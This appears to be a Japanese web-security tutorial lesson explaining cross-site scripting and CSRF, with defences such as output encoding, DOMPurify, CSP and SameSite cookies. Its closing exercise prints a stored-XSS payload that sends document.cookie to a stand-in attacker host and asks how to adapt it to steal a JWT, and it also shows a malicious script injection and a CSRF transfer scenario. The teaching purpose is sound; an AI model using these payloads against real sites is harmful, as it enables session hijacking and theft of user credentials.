# Day 9: Webセキュリティ（その2）- クロスサイトスクリプティング（XSS）＆ CSRF

昨日は、SQLインジェクションからデータベース（バックエンド）を守る方法を学びました。本日は視点を **クライアントサイド（ユーザーのブラウザ側）** に移し、エンドユーザーを直接標的とする極めて危険な2大脆弱性、**クロスサイトスクリプティング（XSS）** と **クロスサイトリクエストフォージェリ（CSRF）** について深く研究します。

これらは、ハッカーがユーザーアカウントを完全に奪取し、本人になりすまして不正送金を行わせ、あるいはあなたのWebサイトを踏み台にしてマルウェアを拡散させるために悪用する極めて致命的な脆弱性です。

---

## 1. クロスサイトスクリプティング（XSS）とは何か？

**XSS（Cross-Site Scripting）** は、Webアプリケーションがユーザーからの不適切な入力を受け取り、それを適切にサニタイズ（無害化）または出力エンコード（エスケープ）することなくそのままWebページ上に出力（レンダリング）することで発生します。被害者のブラウザがそのページを読み込む際、注入された悪意あるスクリプトコードを「サイト本来の正当なJavaScriptコード」と誤認し、自動的に実行してしまいます。

```text
Session Cookieの奪取を目的としたXSS攻撃のモデル：

[ ハッカー ] ──(1) 悪意ある <script> を送信 ──> [ Webサーバー (XSSの脆弱性あり) ]
                                                            │
                                                  (2) ペイロードを保存/表示
                                                            │
                                                            ▼
[ 被害者 ] <──(3) ブラウザでスクリプトが実行される ─── [ Webページ ]
      │
   (4) 機密Cookie情報の自動送信（データ漏洩）
      │
      ▼
[ ハッカーの回収用サーバー ] (アカウントの奪取に成功！)
```

### XSSの主要な3つの分類：

1.  **格納型XSS（蓄積型/Stored XSS / Persistent XSS）：** 最も危険なXSSです。ハッカーが送信した悪意あるJavaScriptコードがサーバーのデータベース（ブログの投稿、コメント欄、ユーザープロフィールの自己紹介など）に永続的に保存されます。そのページを閲覧したすべての一般ユーザーのブラウザで、データ読み込みと同時にスクリプトが自動的に実行されます。
2.  **反射型XSS（非持続型/Reflected XSS / Non-Persistent XSS）：** 悪意あるスクリプトがURLパラメータのクエリ文字列（例：検索窓への入力値 `?q=<script>...`）などに埋め込まれます。被害者がその悪意あるリンクをクリックすると、サーバーはリクエストを受け取り、入力されたスクリプトを応答ページにそのまま埋め込んで送り返し、被害者のブラウザ上で即座に実行させます。
3.  **DOM-based XSS：** サーバー側でのデータ処理を一切経ず、クライアントサイドのJavaScriptだけで発生する脆弱性です。JavaScriptコードが、信頼できないソース（`location.hash` や `document.referrer` など）から取得したデータを、十分な検証なしに `element.innerHTML` や `eval()` などの危険な関数を用いてDOM（Document Object Model）に直接書き込むことで引き起こされます。

### 被害者のブラウザ上で悪意あるJavaScriptが実行されると、何が起こるか？
*   被害者のログインセッションを管理する **Session Cookie** や **Local Storage** に格納されている認証トークン（JWTなど）が読み取られ、ハッカーのサーバーへ自動送信されます。
*   WebページのDOMが改ざんされ、偽のログインフォームなどが描画されてパスワードがフィッシングされます。
*   被害者の名前でSNSメッセージを送信したり、投稿を行ったり、裏でパスワード変更リクエストを勝手に送信されたりします。

## 2. XSSを根本から防ぐ防衛策

XSSからWebアプリケーションを守るためには、「多層防御（Defense-in-Depth）」の考え方が不可欠です。

### 対策 A：出力エンコーディング（Output Encoding）
ユーザーからの動的な入力値をHTML上に描画する前に、HTMLの文法上特別な意味を持つ文字を安全な「HTMLエンティティ」に変換（エスケープ）します：

```text
元の文字   ──>   安全なHTMLエンティティ
   <       ──>       &lt;
   >       ──>       &gt;
   &       ──>       &amp;
   "       ──>       &quot;
   '       ──>       &#x27;
```

例えば、文字列 `<script>` は `&lt;script&gt;` に変換され、ブラウザはこれを「プログラムコード」として解釈せず、単なる「テキスト文字」として描画するため、スクリプトは一切動作しなくなります。
*   *注意：* **React（JSX）** や **Vue.js** などのモダンなフロントエンドフレームワークは、標準でこのエスケープ処理を自動的に実行します。ただし、Reactの `dangerouslySetInnerHTML` などの機能を使ってエスケープを意図的にバイパスした場合は、この自動保護機能が無効化されるため厳重な注意が必要です。

### 対策 B：HTMLサニタイズ（HTML Sanitization）
ブログの記事作成画面など、アプリケーションの仕様上どうしてもユーザーにリッチなHTMLコードの入力を許可しなければならない場合は、クライアント側とバックエンド側の双方で **DOMPurify** などの検証済みの専門ライブラリを使用し、危険なタグ（`<script>`、`<iframe>`）やイベント属性（`onload`、`onerror`、`onclick`）を完全に除去（クリーンアップ）する必要があります。

```javascript
import DOMPurify from 'dompurify';

// 信頼できないHTMLデータをDOMに挿入する前にサニタイズする
const safeHTML = DOMPurify.sanitize(userProvidedHTML);
```

### 対策 C：コンテンツセキュリティポリシー（Content Security Policy - CSP）
**CSP** は、サーバーが応答ヘッダーとして出力するHTTPレスポンスヘッダーで、ブラウザに対して「そのページで読み込みおよび実行を許可するリソース（JavaScript、CSS、画像、API接続先）」のホワイトリストを厳格に指定します。
*   仮にハッカーが `<script src="http://hacker.com/malware.js">` をページ内に注入することに成功したとしても、あなたのWebサイトのCSPヘッダーで「自身のオリジンドメインからのみ実行を許可する（`default-src 'self'`）」と設定されていれば、ブラウザは外部の悪意あるスクリプトの読み込み自体を強制的にブロックします！

## 3. クロスサイトリクエストフォージェリ（CSRF）とは何か？

**CSRF（Cross-Site Request Forgery）** は、すでに特定のWebサイトにログイン状態にある（セッションCookieを保持している）被害者のブラウザを踏み台にして、ハッカーが用意した外部の悪意あるサイトから、強制的に標的のWebサイトに対して意図しないHTTPリクエストを送信させる攻撃手法です。

```text
CSRF攻撃のシナリオ：

1. 被害者が [ Bank.com ] にログインし、ブラウザにセッションCookieが保存される。
2. 被害者はログアウトせずに、別のタブでハッカーが罠を仕掛けた [ Evil.com ] を閲覧する。
3. [ Evil.com ] の裏で動作するスクリプトが、不正なリクエストを自動送信する：
   POST to Bank.com/api/transfer { to: "Hacker", amount: 1000 }
4. 被害者のブラウザは、Bank.com宛てのリクエストなので、保持している有効なCookieを自動で付与する。
5. [ Bank.com ] はCookieが有効であるため、正しいユーザーからの指示と誤認し、送金を実行してしまう！
```

## 4. CSRFを根本から防ぐ防衛策

### 対策 1：SameSite Cookie属性の設定（2026年現在のベストプラクティス）
現代の主要なWebブラウザはCookieの `SameSite` 属性を強力にサポートしています。この属性は、「別サイトから送信されるリクエストの際、そのCookieを自動送信するかどうか」をブラウザに指示するものです。

セッションやログイン状態を管理するCookieには、必ず以下のセキュリティフラグを設定してください：
*   `HttpOnly`：JavaScriptからCookieへのアクセスを遮断（XSSによるCookie奪取を防ぐ）。
*   `Secure`：暗号化されたHTTPS接続でのみCookieを送信。
*   `SameSite=Lax` または `SameSite=Strict`：別サイトからのリクエスト（クロスサイトリクエスト）にCookieが同梱されるのをブロックし、CSRF攻撃を完全に無力化します！

```javascript
// ExpressにおけるセキュアなセッションCookieの設定例
res.cookie('session_token', token, {
    httpOnly: true,     // XSSによるCookie読み取りを防止
    secure: true,       // HTTPS通信でのみ送信
    sameSite: 'strict', // クロスサイトからのCookie送信を完全にブロック（CSRF対策）
    maxAge: 3600000     // 1時間有効
});
```

### 対策 2：CSRFトークン（CSRF Token）の導入
古いブラウザへの対応が必要な場合や、状態変更を伴う重要なAPIエンドポイントでは、ユーザーがフォームを表示した際に、ランダムで推測不可能な暗号学的トークン（**CSRF Token**）を生成します。このトークンはサーバー側で保持されると同時に、クライアント側のフォームに埋め込まれます。POST/PUTリクエストを送信する際、クライアントはリクエストボディやHTTPヘッダーにこのトークンを含める必要があります。
*   ブラウザの「同一生成元ポリシー（Same-Origin Policy）」により、ハッカーが管理する別サイトのスクリプトは、あなたのWebサイトのページ内に表示されているCSRFトークンを読み取ることができないため、リクエストにトークンを付与することができず、サーバー側で不正なリクエストとして即座に却下されます！

## 📝 本日のミニ課題：悪意あるコードの分析

以下は、Stored XSSの脆弱性があるSNSサイトのコメント欄に埋め込まれていた悪意あるペイロードです。

```html
<img src="does-not-exist.jpg" onerror="fetch('https://attacker-collect.com/log?cookie=' + encodeURIComponent(document.cookie))">
```

### 課題：
1.  このコードの各構成要素を分析し、どのように実行されるか（メカニズム）を説明してください。なぜハッカーは典型的な `<script>` タグではなく、`<img>` タグと `onerror` 属性を組み合わせて使用したのでしょうか？
2.  もしシステムがログイン状態の保持にCookieを使用せず、JWT認証トークンを `localStorage` に保存していた場合、ハッカーはJWTを盗み出すために上記のペイロードをどのように変更するでしょうか？
3.  この悪意あるペイロードを完全に無力化するために、あなたが自身のプロジェクトに導入する具体的な技術的対策を2つ挙げてください。
